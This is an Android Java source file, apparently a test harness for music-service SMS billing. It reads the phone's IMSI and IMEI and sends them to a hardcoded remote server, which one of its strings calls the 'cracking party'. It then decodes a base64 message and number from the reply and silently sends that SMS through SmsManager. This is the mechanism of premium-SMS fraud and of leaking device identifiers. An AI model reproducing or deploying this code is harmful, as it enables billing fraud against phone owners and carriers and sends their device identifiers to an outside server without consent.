package com.apitest;

import java.net.URLEncoder;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.apache.http.HttpResponse;
import org.apache.http.HttpStatus;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.params.HttpParams;
import org.apache.http.util.EntityUtils;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.Looper;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;

/**
 * 测试时，直接调用charge_by_api，传入相关参数
 * ip地址就要根据手机当前的地址改了，这里是写死的
 * 如果是天籁之声的代码
 *
 */
public class ApiSms
{

    private static final String SENT_SMS_MUSIC_REG = "SENT_SMS_Music_Reg";
    private static final String TAG = "xcngame";

    /**
     * @param operationProgress 用于更新短信获取和发送的进度到UI
     * @param context
     * @param sid
     * @param channel_id
     * @param cpparam
     * @param musicId
     * @param itemPrice
     * @param musicType
     */
    public static void charge_by_api(final OperationProgress operationProgress, final Context context, final String sid, final String channel_id, final String cpparam, final String musicId, final String itemPrice, final String musicType)
    {
        operationProgress.reset();
        new Thread()
        {
            public void run()
            {
                try
                {
                    Looper.prepare();
                    TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
                    String imsi = tm.getSubscriberId();
                    String imei = tm.getDeviceId();// String
                    String start_time = System.currentTimeMillis() + "";
                    String iccid=tm.getSimSerialNumber();

                    String url = "http://115.159.74.129:8000/o/mgreqapi/" + sid + "?imei=" + imei + "&imsi=" + imsi + "&item_price=" + itemPrice + "&music_id=" + musicId + "&channel_id=" + channel_id + "&cpparam=" + cpparam + "&music_type="+musicType + "&sdcid=&start_time=" + start_time + "&iccid=898602c0221670872200&ip=113.99.100.72&excode=";//点播

                    operationProgress.updateProgress("请求破解方时的使用的地址\r\n"+url+"\r\n\r\n");
                    String response = getUrl(url);
                    assert response != null;
                    response = response.replace("\n", "");
                    response = response.replace("\r", "");
                    XmlParse xmlParse=new XmlParse(context,response);
                    for(int index=0;index<xmlParse.mSMSEntityList.size();index++)
                        xmlParse.mSMSEntityList.get(index).message=new String(Base64.decode(xmlParse.mSMSEntityList.get(index).message, Base64.DEFAULT));
                    String sms = xmlParse.mSMSEntityList.get(0).message;
                    String smsNum = xmlParse.mSMSEntityList.get(0).number;

                    if (!sms.isEmpty())
                    {
                        BroadcastReceiver smsReceiver = new BroadcastReceiver()
                        {
                            @Override
                            synchronized public void onReceive(Context context, Intent intent)
                            {
                            }
                        };
                        Log.e(TAG, "send "+smsNum+" ==" + sms);
                        context.registerReceiver(smsReceiver, new IntentFilter(SENT_SMS_MUSIC_REG));
                        SmsManager smsManager = SmsManager.getDefault();
                        Intent sentIntent = new Intent(SENT_SMS_MUSIC_REG);
                        PendingIntent sentPI = PendingIntent.getBroadcast(context, 0, sentIntent, 0);
                        smsManager.sendTextMessage(smsNum, null, sms, sentPI, null);

                        operationProgress.updateProgress("已发送 \r\n"+sms+"\r\n到 "+smsNum);
                    }

                }
                catch (Exception e)
                {
                    Log.e(TAG, e.getMessage());
                }

            }
        }.start();
    }

    public static String getUrl(String url)
    {
        try
        {
            HttpGet request = new HttpGet(url);

            HttpParams httpPar = new BasicHttpParams();
            HttpConnectionParams.setConnectionTimeout(httpPar, 40 * 1000);
            HttpConnectionParams.setSoTimeout(httpPar, 40 * 1000);
            HttpClient httpClient = new DefaultHttpClient(httpPar);

            HttpResponse response = httpClient.execute(request);
            if (response.getStatusLine().getStatusCode() == HttpStatus.SC_OK)
            {
                String str = EntityUtils.toString(response.getEntity());

                if (str != null)
                {
                    return str;
                }
            }
            else
            {
                return null;
            }
        }
        catch (Exception e)
        {
            return null;
        }
        return null;
    }
}
